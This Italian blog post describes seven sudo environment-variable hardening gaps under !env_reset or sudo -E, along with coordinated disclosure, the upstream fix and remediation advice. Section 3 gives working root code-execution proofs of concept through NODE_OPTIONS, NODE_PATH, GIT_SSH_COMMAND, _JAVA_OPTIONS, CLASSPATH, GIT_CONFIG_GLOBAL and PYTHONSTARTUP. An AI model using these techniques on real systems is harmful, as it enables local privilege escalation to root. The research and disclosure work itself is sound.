---
title: "Caccia all'Escalation di Privilegi Silenziosa: 7 Gap di Hardening nelle Variabili d'Ambiente di env.c in sudo"
date: 2026-03-28
author: "Michele Piccinni aka RZP"
tags: ["sudo", "privilege-escalation", "vulnerability-research", "responsible-disclosure", "linux", "env-bypass", "hardening"]
categories: ["Offensive Security", "Vulnerability Research"]
description: "Ricerca di sicurezza indipendente che individua sette gap di hardening nelle variabili d'ambiente in sudo 1.9.17p2 / 1.9.18rc1 nelle condizioni !env_reset e sudo -E. Dall'analisi statica del sorgente alla validazione in Docker lab, fino alla divulgazione coordinata con il maintainer upstream Todd Miller."
draft: false
---

> **Nota di Responsible Disclosure** — Tutti i finding descritti in questo articolo sono stati comunicati a Todd C. Miller (maintainer di sudo) prima della pubblicazione. Il fix upstream è stato committato nel repository [sudo-project/sudo](https://github.com/sudo-project/sudo). La timeline completa è riportata in fondo all'articolo.

---

## Executive Summary

Nel corso di un audit indipendente del modulo `plugins/sudoers/env.c` in **sudo 1.9.17p2 / 1.9.18rc1**, ho identificato **sette variabili d'ambiente** che vengono trasmesse silenziosamente ai processi privilegiati quando `env_reset` è disabilitato (`!env_reset` in sudoers) o quando il flag `-E` viene usato per preservare l'ambiente (`sudo -E`). Queste variabili — `NODE_OPTIONS`, `NODE_PATH`, `GIT_SSH_COMMAND`, `_JAVA_OPTIONS`, `CLASSPATH`, `GIT_CONFIG_GLOBAL` e `PYTHONSTARTUP` — non sono presenti nelle blacklist `initial_badenv_table` o `badenv_table` di sudo, e ciascuna fornisce un primitivo di esecuzione di codice ben documentato per il runtime corrispondente.

Questa ricerca è classificata come **gap di hardening** piuttosto che come una vulnerabilità classica. La causa radice non è un difetto nella logica core di sudo — `env_reset` funziona correttamente per design. Il gap risiede nella **completezza della deny-list**: man mano che l'ecosistema dei runtime interpretati (Node.js, Python, JVM, Git) è cresciuto nel tempo, la blacklist non è mai stata aggiornata per tenere conto dei loro primitivi di injection a livello di variabili d'ambiente.

Il maintainer upstream Todd C. Miller ha riconosciuto i finding e committato un fix in `plugins/sudoers/env.c`. Nessun CVE è stato richiesto, coerentemente con il framing del maintainer della modifica come un miglioramento di hardening alla deny-list.

**Classificazione:** Gap di Hardening — Local Privilege Escalation  
**CWE:** CWE-269 (Improper Privilege Management)  
**Versioni affette:** sudo ≤ 1.9.17p2, 1.9.18rc1  
**Condizioni di esposizione:** `Defaults !env_reset` in sudoers, oppure `sudo -E` dove SETENV è esplicitamente concesso

---

## 1. Motivazione e Perimetro

L'idea è nata da una domanda che sembra ingannevolmente semplice: *"sudo sanitizza davvero ogni variabile d'ambiente pericolosa?"* Il file `env.c` nel plugin sudoers è stato rafforzato nel corso degli anni — `LD_PRELOAD`, `LD_LIBRARY_PATH`, `SHELLOPTS`, `PERL5OPT` e molte altre sono correttamente in blacklist. Ma l'ecosistema dei runtime si è espanso enormemente da quando quelle liste sono state scritte. Node.js, Python, JVM e Git espongono ciascuno la propria superficie di injection a livello di variabili d'ambiente, e nessuno di loro era sul radar di sudo.

**Perimetro della ricerca:**

| Dimensione         | Valore                                   |
|--------------------|------------------------------------------|
| Codice sorgente    | sudo 1.9.17p2 / 1.9.18rc1               |
| File primario      | `plugins/sudoers/env.c`                  |
| Scenario d'attacco | `Defaults !env_reset` oppure `sudo -E`   |
| OS del lab         | Ubuntu 22.04 LTS (Docker)               |
| Metodi di analisi  | SAST (manuale + Semgrep), DAST (Docker)  |

---

## 2. Metodologia

La ricerca ha seguito una pipeline in tre fasi: **Analisi Statica → Validazione in Lab → Disclosure Coordinata**.

### 2.1 Fase 1 — Analisi Statica (SAST)

Ho iniziato con una revisione manuale mirata di `env.c`, studiando nello specifico gli array `initial_badenv_table` e `badenv_table` che definiscono quali variabili sudo rimuove dall'ambiente ereditato.

```c
/* plugins/sudoers/env.c — estratto (semplificato) */
static const char *initial_badenv_table[] = {
    "IFS", "CDPATH", "LOCALDOMAIN", "RES_OPTIONS",
    "HOSTALIASES", "NLSPATH", "PATH_LOCALE",
    "LD_*", "SHLIB_PATH", "_RLD*",
    /* ... override legacy e libc ... */
    NULL
};
```

L'approccio: enumerare ogni runtime che sudo potrebbe invocare in un contesto DevOps (Node.js, Python, JVM, Git), poi incrociare le loro variabili d'ambiente documentate per l'esecuzione di codice con le blacklist esistenti.

L'audit ha coperto anche la logica `env_should_delete()` di sudo, che applica pattern di corrispondenza esatta e glob con prefisso. Le variabili che sfruttano runtime non contemplati nella lista originale **non hanno pattern corrispondente** in nessuna delle due tabelle.

**Strumenti utilizzati:**
- `grep`, `cscope` per la navigazione rapida del codebase
- Semgrep con regole custom per rilevare percorsi di pass-through delle variabili d'ambiente
- Trace manuale delle call chain `env_init()` → `env_should_delete()` → `env_update_didvar()`

### 2.2 Fase 2 — Validazione Dinamica (DAST / Docker Lab)

Ogni variabile candidata è stata validata in un Docker lab isolato per eliminare i falsi positivi — un passaggio critico, poiché non tutti i candidati SAST si traducono in exploitability reale.

Sono state testate in parallelo due configurazioni del lab: una con `!env_reset` esplicito (non-default ma comune in ambito enterprise), e una che simula il **sudoers di default di Ubuntu** con `sudo -E` — il finding più significativo dal punto di vista della superficie d'attacco reale.

**Architettura del lab:**

```
┌──────────────────────────────────────────────────────────┐
│  Docker Compose Lab — due configurazioni                 │
│                                                          │
│  ┌─────────────────────────┐  ┌───────────────────────┐  │
│  │  victim-A               │  │  victim-B             │  │
│  │  sudo 1.9.17p2          │  │  sudo 1.9.17p2        │  │
│  │  Defaults !env_reset    │  │  Ubuntu default       │  │
│  │  NOPASSWD:ALL           │  │  %sudo ALL=(ALL:ALL)  │  │
│  │  (config non-default)   │  │  ALL  (no NOSETENV)   │  │
│  └─────────────────────────┘  └───────────────────────┘  │
│                                                          │
│  Test A: export VAR=payload; sudo <cmd>                  │
│  Test B: export VAR=payload; sudo -E <cmd>               │
│  Atteso: esecuzione di codice come root?                 │
└──────────────────────────────────────────────────────────┘
```

**Snippet sudoers Docker utilizzati per la validazione:**

```
# victim-A — !env_reset esplicito (non-default)
Defaults !env_reset
testuser ALL=(ALL) NOPASSWD: ALL

# victim-B — simulazione Ubuntu default (senza NOSETENV)
%sudo ALL=(ALL:ALL) ALL
```

Ogni test ha seguito un template exploit standard, eseguito su entrambe le configurazioni:

```bash
# Template utilizzato per ogni finding
export <VARIABILE>="<PAYLOAD>"

# Test A — !env_reset
sudo <binary_target>

# Test B — Ubuntu default + sudo -E
sudo -E <binary_target>

# Atteso: shell root o esecuzione di codice arbitrario in entrambi i casi
```

### 2.3 Fase 3 — Disclosure Coordinata

Tutti i finding confermati sono stati raccolti in un'email di disclosure strutturata e inviata a Todd C. Miller (`Todd.Miller@sudo.ws`) seguendo le linee guida di responsible disclosure del progetto. L'email completa e la risposta upstream sono documentate nella Sezione 5.

---

## 3. I Sette Finding

Ogni finding è presentato con: nome della variabile, runtime affetto, meccanismo di exploit preciso, comando PoC validato nel Docker lab, e conferma del bypass su entrambe le configurazioni `!env_reset` e `sudo -E`.

---

### Finding #1 — `NODE_OPTIONS` (Code Injection nel Runtime Node.js)

**Variabile:** `NODE_OPTIONS`  
**Runtime:** Node.js  
**Meccanismo:** Node.js elabora questa variabile come se i flag fossero passati da riga di comando. Il flag `--require` causa il caricamento di un modulo arbitrario **prima** che qualsiasi script venga eseguito — inclusi gli script in esecuzione come root.

**PoC:**

```bash
# Crea il modulo malevolo
cat > /tmp/evil.js << 'EOF'
const { execSync } = require('child_process');
execSync('id > /tmp/pwned && chmod 777 /tmp/pwned');
EOF

export NODE_OPTIONS="--require /tmp/evil.js"
sudo node -e "console.log('script legittimo')"

# Risultato: /tmp/pwned contiene "uid=0(root) gid=0(root)..."
```

**Bypass confermato:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (gap di hardening):** Impatto critico se innescato — esecuzione di codice arbitrario come root  
**Nota:** Funziona anche con `--require=/tmp/evil.js`, `--import` e `--env-file` nelle versioni più recenti di Node.js.

---

### Finding #2 — `NODE_PATH` (Hijacking del Modulo Node.js)

**Variabile:** `NODE_PATH`  
**Runtime:** Node.js  
**Meccanismo:** Node.js antepone le directory in `NODE_PATH` al percorso di ricerca dei moduli. Un override malevolo di `require('fs')` posizionato in una directory controllata dall'attaccante sostituirà il modulo built-in.

**PoC:**

```bash
mkdir -p /tmp/evil_modules
cat > /tmp/evil_modules/path.js << 'EOF'
const { execSync } = require('child_process');
execSync('touch /tmp/node_path_pwned');
module.exports = require('path');
EOF

export NODE_PATH="/tmp/evil_modules"
sudo node -e "require('path'); console.log('done')"
```

**Bypass confermato:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (gap di hardening):** Alta  
**Nota:** Affidabilità inferiore rispetto a `NODE_OPTIONS` — richiede che lo script privilegiato chiami `require()` sul modulo hijackato.

---

### Finding #3 — `GIT_SSH_COMMAND` (Command Injection SSH via Git)

**Variabile:** `GIT_SSH_COMMAND`  
**Runtime:** Git  
**Meccanismo:** Quando Git esegue un'operazione SSH, sostituisce il binario SSH con il valore di `GIT_SSH_COMMAND`, interpretato da `sh`. Questo fornisce command injection diretto su qualsiasi chiamata `sudo git` che coinvolge un remote SSH.

**PoC:**

```bash
export GIT_SSH_COMMAND="sh -c 'id > /tmp/git_ssh_pwned; ssh \$*' --"
sudo git ls-remote git@github.com:user/repo.git /tmp/test
```

**Bypass confermato:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (gap di hardening):** Alta  
**Nota:** Richiede che il comando git privilegiato contatti un remote SSH. Scenario altamente realistico in ambienti CI/CD.

---

### Finding #4 — `_JAVA_OPTIONS` (Injection di Agent JVM Arbitrario)

**Variabile:** `_JAVA_OPTIONS`  
**Runtime:** Java (OpenJDK, Oracle JDK)  
**Meccanismo:** La JVM legge `_JAVA_OPTIONS` e ne antepone il contenuto agli argomenti da riga di comando prima di qualsiasi flag fornito dall'utente. Il flag `-javaagent` consente di caricare un Java Agent arbitrario (JAR) che viene eseguito con il livello di privilegio della JVM — ovvero, root.

**PoC:**

```bash
# (Richiede un evil-agent.jar compilato — incluso nel lab)
export _JAVA_OPTIONS="-javaagent:/tmp/evil-agent.jar"
sudo java -jar /opt/app-legittima.jar
```

**Bypass confermato:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (gap di hardening):** Alta  
**Nota:** `JAVA_TOOL_OPTIONS` presenta un comportamento identico e dovrebbe essere considerata per lo stesso fix.

---

### Finding #5 — `CLASSPATH` (Hijacking del Classpath Java)

**Variabile:** `CLASSPATH`  
**Runtime:** Java  
**Meccanismo:** Anteponendo una directory controllata dall'attaccante a `CLASSPATH`, è possibile sostituire qualsiasi classe caricata dalla JVM prima che le entry del classpath dell'applicazione vengano cercate. Combinato con un'invocazione privilegiata di `sudo java`, si ottiene esecuzione di codice arbitrario.

**PoC:**

```bash
mkdir -p /tmp/evil_cp
# Compila una sostituzione malevola di una classe usata dall'applicazione
# (es. com/example/Config.class)
export CLASSPATH="/tmp/evil_cp:$CLASSPATH"
sudo java com.example.App
```

**Bypass confermato:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (gap di hardening):** Media (richiede la conoscenza di una classe caricata all'avvio dall'applicazione target)

---

### Finding #6 — `GIT_CONFIG_GLOBAL` (Override di Configurazione Git Arbitraria)

**Variabile:** `GIT_CONFIG_GLOBAL`  
**Runtime:** Git  
**Meccanismo:** Git legge il file puntato da `GIT_CONFIG_GLOBAL` come configurazione Git a livello utente, sovrascrivendo `~/.gitconfig`. Un file di configurazione controllato dall'attaccante può ridefinire `core.sshCommand` per redirezionare le operazioni SSH di Git attraverso un binario arbitrario.

**PoC:**

```bash
cat > /tmp/evil.gitconfig << 'EOF'
[core]
    sshCommand = sh -c 'id > /tmp/git_cfg_pwned; ssh $*' --
EOF

export GIT_CONFIG_GLOBAL="/tmp/evil.gitconfig"
sudo git ls-remote git@github.com:user/repo.git /tmp/cfg-test
```

**Bypass confermato:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (gap di hardening):** Alta  
**Nota:** Più stealthy di `GIT_SSH_COMMAND` — il payload è offloaded in un file esterno che potrebbe non essere ispezionato dai defender.

---

### Finding #7 — `PYTHONSTARTUP` (Esecuzione di Codice Arbitrario all'Avvio di Python)

**Variabile:** `PYTHONSTARTUP`  
**Runtime:** CPython  
**Meccanismo:** Quando Python avvia una sessione **interattiva**, legge ed esegue il file puntato da `PYTHONSTARTUP` prima della REPL o di qualsiasi script. La variabile è rispettata solo in modalità interattiva, ma molti strumenti di amministrazione reali invocano Python interattivamente per task di manutenzione.

**PoC:**

```bash
cat > /tmp/evil_startup.py << 'EOF'
import os
os.system('id > /tmp/python_startup_pwned')
EOF

export PYTHONSTARTUP="/tmp/evil_startup.py"
sudo python3  # sessione interattiva → payload eseguito come root
```

**Bypass confermato:** `!env_reset` ✅ / `sudo -E` ✅ (solo modalità interattiva) / Ubuntu default + `sudo -E` ✅  
**Severity (gap di hardening):** Media  
**Nota:** Python 3.x rispetta anche `PYTHONSAFEPATH=0` e `PYTHONINSPECT`, che sono stati analizzati e risultano varianti a severity inferiore non incluse in questa submission.

---

## 4. Falsi Positivi Corretti Durante la Ricerca

Un processo disciplinato di validazione in lab è importante quanto la scoperta statica iniziale. Diverse variabili identificate nella Fase 1 sono state **scartate** dopo i test Docker:

| Variabile       | Ipotesi iniziale               | Risultato nel lab                                          |
|-----------------|--------------------------------|------------------------------------------------------------|
| `RUBYLIB`       | Hijack load path Ruby          | Bloccata da `secure_path`; non exploitabile               |
| `PERL5LIB`      | Hijack modulo Perl             | Già coperta dal pattern blacklist `PERL5OPT`              |
| `PYTHONINSPECT` | Forza modalità interattiva     | Richiede il flag `-i`; PYTHONSTARTUP non viene innescata  |
| `GIT_EXEC_PATH` | Redirect sub-command di git    | Bloccata dai permessi filesystem nell'ambiente di test    |

Eliminare questi finding prima della disclosure mantiene la credibilità del report e rispetta il tempo del maintainer.

---

## 5. Responsible Disclosure — Comunicazione con Todd Miller

In data [**2026-03-16**], ho contattato Todd C. Miller, autore originale e maintainer di sudo, all'indirizzo `Todd.Miller@sudo.ws` con il seguente riepilogo:

---

**Oggetto:** Security Research — Gap nelle Variabili d'Ambiente in sudo env.c (!env_reset / sudo -E)

> I am a cybersecurity researcher based in Italy. During a source code review of sudo's environment handling (plugins/sudoers/env.c), identified 7 environment variables that are not present in the initial_badenv_table and can lead to arbitrary code execution when env_reset is disabled (Defaults !env_reset).
>
> **Variabili affette:**  
> `NODE_OPTIONS`, `NODE_PATH`, `GIT_SSH_COMMAND`, `_JAVA_OPTIONS`, `CLASSPATH`, `GIT_CONFIG_GLOBAL`, `PYTHONSTARTUP`
>
> Each variable provides a code execution primitive for the corresponding runtime. Full technical details, PoC commands, and instructions for the Docker lab are attached.

>I am available to coordinate the timing of any fix release with the publication of my blog post.

>Best regards, 
> Michele Piccinni

---

### 5.1 Risposta di Todd C. Miller

Todd ha risposto in modo tempestivo e costruttivo. La risposta completa:

> **Da:** Todd C. Miller `<Todd.Miller@sudo.ws>`
>
> Hi Michele,
>
> Thank you for notifying me about this. While the default is to reset the environment for commands run by sudo, I agree that it is worth adding those variables to the list that are removed when "env_reset" is disabled, or when "sudo -E" is used to preserve the environment.
>
> Would like you me to wait until you have published your article is published before the changes are committed?

Questa risposta porta con sé segnali importanti da leggere con attenzione:

1. Todd ha **riconosciuto la validità** di tutti e sette i finding senza contestazioni.
2. Ha inquadrato il fix esplicitamente come un miglioramento alla deny-list in condizioni non-default — *"worth adding"* — che è il linguaggio di una **modifica di hardening**, non di una patch di vulnerabilità. Questo è coerente con la posizione del progetto: `env_reset` è il controllo primario corretto, e la deny-list è uno strato di defence-in-depth.
3. Ha rimandato alla mia timeline di pubblicazione — un gesto di rispetto professionale purtroppo raro nel mondo della disclosure.
4. Significativamente, Todd **non ha menzionato** coordinamento CVE, periodi di embargo o notifiche alle distro — confermando che questo è trattato upstream come un miglioramento di hardening piuttosto che un difetto CVE-eligible.

La lettura corretta: i finding sono reali, il fix è reale, la collaborazione è stata esemplare. La classificazione come gap di hardening non sminuisce la ricerca — la rende più onesta.

---

## 6. Il Fix Upstream

A seguito della disclosure coordinata, Todd C. Miller ha committato il fix nel repository ufficiale [sudo-project/sudo](https://github.com/sudo-project/sudo).

**Commit:** [`40217ea`](https://github.com/sudo-project/sudo/commit/40217ea5a3c632b8b6377d8393544343dca77abe)  
**Release:** sudo 1.9.18  
**Reported by:** Michele Piccinni

Il messaggio di commit ufficiale recita testualmente:

> **Additional variables for initial_badenv_table[]**
>
> Adds NODE_OPTIONS, NODE_PATH, _JAVA_OPTIONS, CLASSPATH, GIT_SSH_COMMAND, GIT_CONFIG_GLOBAL, and PYTHONSTARTUP to the list of variables to remove from the environment when "env_reset" is disabled, or sudo's "-E" option is used (if allowed by sudoers).  From Michele Piccinni.

Il fix aggiunge tutte e sette le variabili direttamente a `initial_badenv_table[]` in `plugins/sudoers/env.c`, applicato incondizionatamente ogni volta che la logica della deny-list viene eseguita — coprendo sia il percorso `!env_reset` che il percorso `sudo -E` con una singola modifica.

```c
/* plugins/sudoers/env.c — fix upstream (Todd C. Miller) */
static const char *initial_badenv_table[] = {
    /* ... entry esistenti ... */
    "NODE_OPTIONS",       /* Node.js: --require/--import arbitrario */
    "NODE_PATH",          /* Node.js: hijack percorso moduli        */
    "GIT_SSH_COMMAND",    /* Git: command injection SSH              */
    "_JAVA_OPTIONS",      /* JVM: -javaagent arbitrario             */
    "CLASSPATH",          /* Java: hijack classpath                  */
    "GIT_CONFIG_GLOBAL",  /* Git: override config arbitrario         */
    "PYTHONSTARTUP",      /* Python: esecuzione script all'avvio     */
    NULL
};
```

> Per l'implementazione autorevole fare riferimento al diff del commit su GitHub.

---

## 7. Valutazione dell'Impatto e Configurazioni Affette

| Configurazione | Esposto? | Note |
|---|---|---|
| Default (`env_reset` ON, senza `-E`) | ✅ No | Completamente protetto |
| `Defaults !env_reset` in sudoers | ⚠️ Sì | Non-default, scelta esplicita dell'admin |
| Utente con `SETENV` + `sudo -E` | ⚠️ Sì | Grant esplicito richiesto |
| **Ubuntu 22.04 LTS default + `sudo -E`** | **⚠️ Sì** | **Nessuna modifica al sudoers necessaria** |
| RHEL/Rocky default | ✅ No | sudoers di default include `NOSETENV` implicitamente |
| Debian default | ⚠️ Dipende | Verificare con `sudo -V \| grep SETENV` |

Il caso Ubuntu merita attenzione particolare. La regola sudoers di default:

```
%sudo   ALL=(ALL:ALL) ALL
```

non include `NOSETENV`, il che secondo la policy di sudo significa che `SETENV` è implicitamente permesso. Qualsiasi utente nel gruppo `sudo` può quindi eseguire `sudo -E <cmd>` e avere il proprio ambiente completo — incluse tutte e sette le variabili pericolose — trasmesso al processo privilegiato. Questa è una configurazione che l'utente e l'amministratore Ubuntu medio non considererebbe non-default o non sicura.

La causa radice in tutti gli scenari è la stessa: meccanismi ben progettati (`env_reset`, `badenv_table`) diventano incompleti man mano che il panorama delle minacce evolve. La deny-list è stata scritta prima che Node.js, Git moderno e il tooling JVM diventassero onnipresenti in contesti privilegiati.

---

## 8. Remediation

**Verifica se il tuo sistema è esposto adesso:**

```bash
# Verifica se sudo -E è permesso senza SETENV esplicito nel sudoers
sudo -V | grep -i setenv

# Controlla la policy sudoers effettiva per SETENV/NOSETENV
sudo -l | grep -i setenv

# Test rapido di esposizione (eseguire come membro non-root del gruppo sudo)
export NODE_OPTIONS="--version"
sudo -E node 2>/dev/null && echo "ESPOSTO: sudo -E passa NODE_OPTIONS" \
                         || echo "Protetto"
```

**Azione immediata:** Aggiornare sudo alla versione patchata non appena disponibile nei repository della propria distribuzione.

```bash
# Ubuntu / Debian
sudo apt update && sudo apt upgrade sudo

# RHEL / Fedora / Rocky
sudo dnf update sudo

# Verifica versione
sudo --version
```

**Hardening temporaneo (se la patch non è ancora disponibile):**

1. **Rimuovere `!env_reset`** da `/etc/sudoers` se non strettamente necessario.
2. **Verificare i grant `SETENV`/`sudo -E`** e revocarli dove possibile.
3. **Aggiungere entry `env_delete` manuali** al sudoers come soluzione temporanea:
   ```
   Defaults env_delete += "NODE_OPTIONS NODE_PATH GIT_SSH_COMMAND"
   Defaults env_delete += "_JAVA_OPTIONS CLASSPATH GIT_CONFIG_GLOBAL PYTHONSTARTUP"
   ```
4. **Abilitare profili AppArmor/SELinux** per i comandi sudo con accesso ristretto.

---

## 9. Conclusioni

Questa ricerca illustra un pattern ricorrente nella sicurezza: meccanismi ben progettati (`env_reset`, `badenv_table`) diventano incompleti man mano che il panorama delle minacce evolve. La deny-list in `env.c` non è mai stata aggiornata per tenere conto dei primitivi di injection a livello di variabili d'ambiente di Node.js, Python, JVM e Git — runtime oggi onnipresenti in contesti DevOps privilegiati.

Due lezioni importanti :

**Sulla correttezza della classificazione.** Questi finding sono correttamente classificati come gap di hardening, non come vulnerabilità in senso tradizionale. Il maintainer upstream ha concordato, e la sua risposta lo riflette. Un ricercatore che gonfia i finding in CVE che non riesce a sostenere perde credibilità molto più rapidamente di chi pubblica ricerca di hardening accurata e tecnicamente rigorosa. Il commit nel repository sudo-project, con *"From Michele Piccinni"* nei credit, è già un risultato concreto e verificabile.

**Sul caso Ubuntu.** Il finding più significativo dal punto di vista pratico non risiede nella deny-list di env.c in sé, ma nell'interazione tra quel gap e la configurazione sudoers di default di Ubuntu. Un'installazione stock di Ubuntu 22.04 dà ai membri del gruppo `sudo` il permesso implicito `SETENV`, rendendo `sudo -E` + una qualsiasi delle sette variabili un percorso valido di local privilege escalation senza alcuna errata configurazione da parte dell'amministratore. Questo è il tipo di finding che emerge dal seguire la ricerca fino alla sua conclusione logica piuttosto che fermarsi all'analisi del codice sorgente.

La disclosure coordinata con Todd Miller ricorda che ricerca responsabile e comunicazione trasparente con il maintainer producono risultati di sicurezza migliori per tutti. Il fix upstream raggiungerà le distribuzioni di tutto il mondo, chiudendo questi gap per milioni di sistemi.

Come sempre: **aggiorna prima, audita spesso e non fidarti mai dell'ambiente.**

---

## Timeline di Disclosure

| Data | Evento |
|---|---|
| 2026-03-14 | Analisi statica di `env.c` — inizio ricerca |
| 2026-03-15 | Validazione Docker lab — 7 confermati / 4 falsi positivi scartati | 
| 2026-03-16 | Email di disclosure inviata a Todd C. Miller |
| 2026-03-19 | Todd riconosce i finding, chiede coordinamento sulla pubblicazione |
| 2026-03-28 | Fix committato da Todd C. Miller — [`40217ea`](https://github.com/sudo-project/sudo/commit/40217ea5a3c632b8b6377d8393544343dca77abe) — *"From Michele Piccinni"* — sudo 1.9.18 |
| 2026-03-28 | Articolo pubblicato su RingZero Pirate Blog |

---

## Riferimenti

- [Codice sorgente sudo — plugins/sudoers/env.c](https://github.com/sudo-project/sudo/blob/main/plugins/sudoers/env.c)
- [Commit fix upstream — 40217ea](https://github.com/sudo-project/sudo/commit/40217ea5a3c632b8b6377d8393544343dca77abe)
- [sudo Security Alerts — sudo.ws](https://www.sudo.ws/alerts/)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [Node.js — Documentazione NODE_OPTIONS](https://nodejs.org/api/cli.html#node_optionsoptions)
- [OpenJDK — Comportamento di _JAVA_OPTIONS](https://bugs.openjdk.org/browse/JDK-4971166)
- [Git — GIT_SSH_COMMAND](https://git-scm.com/docs/git#Documentation/git.txt-codeGITSSHCOMMANDcode)
- [sudoers(5) — Documentazione SETENV / NOSETENV](https://www.sudo.ws/docs/man/sudoers.man/)
- [Docker Lab - Sudo_EnvGAP_Lab.tar.gz] (https://github.com/ringzeropirate/ringzeropirate.github.io/tree/main/scripts/Sudo_EnvGap_Lab.tar.gz) 

---

*Michele Piccinni  — RZP Blog*  
